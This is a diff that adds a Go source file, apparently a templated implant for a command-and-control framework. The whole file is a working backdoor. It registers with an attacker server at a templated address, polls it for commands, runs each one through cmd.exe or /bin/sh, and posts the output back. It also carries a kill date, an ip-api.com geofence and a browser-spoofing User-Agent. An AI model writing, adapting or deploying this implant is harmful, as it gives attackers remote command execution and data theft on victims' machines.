@@ -1,0 +1,99 @@
+package main
+
+import (
+	"net"
+	"os/exec"
+	"runtime"
+    "time"
+    "net/http"
+    "io/ioutil"
+    "strings"
+    "bytes"
+    "os"
+)
+
+func main() {
+    // Guardrails
+    {% if kill_date %}
+    k, _ := time.Parse("2006-01-02", "{{ kill_date }}")
+    if time.Now().After(k) {
+        return
+    }
+    {% endif %}
+
+    {% if geofence %}
+    resp, err := http.Get("http://ip-api.com/line/?fields=countryCode")
+    if err == nil {
+        defer resp.Body.Close()
+        body, _ := ioutil.ReadAll(resp.Body)
+        cc := strings.TrimSpace(string(body))
+        if cc != "{{ geofence }}" {
+            return
+        }
+    }
+    {% endif %}
+
+    // HTTP Transport C2
+    target := "http://{{ ip }}:{{ port }}"
+    
+    // Register
+    // Using a fake UUID/ID generation or just requesting one
+    client := &http.Client{}
+    req, _ := http.NewRequest("POST", target, nil)
+    req.Header.Set("User-Agent", "Mozilla/5.0")
+    // Request ID? Protocol says if no ID, server assigns. 
+    // We poll until we get ID or just assume we have one if response says "REGISTERED <ID>"
+    
+    // Simple Loop
+    id := ""
+    
+    for {
+        // Poll
+        req, _ := http.NewRequest("POST", target, nil)
+        if id != "" {
+            req.Header.Set("X-Session-ID", id)
+        }
+        
+        resp, err := client.Do(req)
+        if err != nil {
+            time.Sleep(5 * time.Second)
+            continue
+        }
+        
+        body, _ := ioutil.ReadAll(resp.Body)
+        resp.Body.Close()
+        cmdStr := string(body)
+        
+        if id == "" && strings.HasPrefix(cmdStr, "REGISTERED") {
+            parts := strings.Split(cmdStr, " ")
+            if len(parts) > 1 {
+                id = parts[1]
+            }
+            continue
+        }
+        
+        if cmdStr != "" {
+            // Execute
+            var cmd *exec.Cmd
+            if runtime.GOOS == "windows" {
+                cmd = exec.Command("cmd.exe", "/c", cmdStr)
+            } else {
+                cmd = exec.Command("/bin/sh", "-c", cmdStr)
+            }
+            
+            var out bytes.Buffer
+            cmd.Stdout = &out
+            cmd.Stderr = &out
+            cmd.Run()
+            
+            // Post result
+            req2, _ := http.NewRequest("POST", target, bytes.NewBuffer(out.Bytes()))
+            if id != "" {
+                req2.Header.Set("X-Session-ID", id)
+            }
+            client.Do(req2)
+        }
+        
+        time.Sleep(2 * time.Second)
+    }
+}
